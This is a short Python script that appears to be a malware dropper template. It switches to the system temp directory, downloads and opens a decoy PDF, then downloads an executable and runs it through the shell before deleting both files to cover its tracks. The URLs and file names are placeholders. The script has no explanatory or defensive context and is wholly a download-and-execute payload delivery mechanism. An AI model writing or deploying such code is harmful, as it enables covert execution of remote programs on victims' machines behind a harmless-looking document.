import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1].split("?")[0]
    with open(file_name, "wb") as out_file:
             out_file.write(get_response.content)   
        
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)


download("pdf_url")
subprocess.Popen("pdf_name", shell=True)

download("exe_url")
subprocess.call("exe_name", shell=True)


os.remove("pdf_name")
os.remove("exe_name")
